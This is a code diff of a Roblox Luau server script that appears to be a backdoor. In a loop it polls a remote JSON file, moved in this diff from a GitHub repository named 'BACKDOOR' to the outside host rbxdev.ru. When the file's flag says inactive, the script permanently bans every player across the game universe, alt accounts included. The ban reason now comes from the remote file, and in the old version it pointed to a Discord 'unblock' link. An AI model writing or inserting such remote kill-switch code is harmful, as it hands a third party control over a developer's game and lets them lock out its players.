@@ -6,8 +6,9 @@ local httpService = game:GetService("HttpService")
 while true do
 
 	for _, plr in game.Players:GetPlayers() do
-		local Info = httpService:GetAsync("https://raw.githubusercontent.com/diaslo/BACKDOOR/refs/heads/main/Activity.json")
+		local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
 		local Decoded = httpService:JSONDecode(Info)
+		
 
 		if Decoded.Active == false then
 			game.Players:BanAsync({
@@ -15,8 +16,8 @@ while true do
 				UserIds = {plr.UserId},
 				ApplyToUniverse = true, 
 				Duration = -1, 
-				DisplayReason = 'Central Bureau of Protection | Unblock - https://discord.gg/4mwXqTuEQg',
-				PrivateReason = 'Central Bureau of Protection | Unblock - https://discord.gg/4mwXqTuEQg', 
+				DisplayReason = tostring(Decoded.Reason),
+				PrivateReason = tostring(Decoded.Reason), 
 				ExcludeAltAccounts = false,
 
 			})
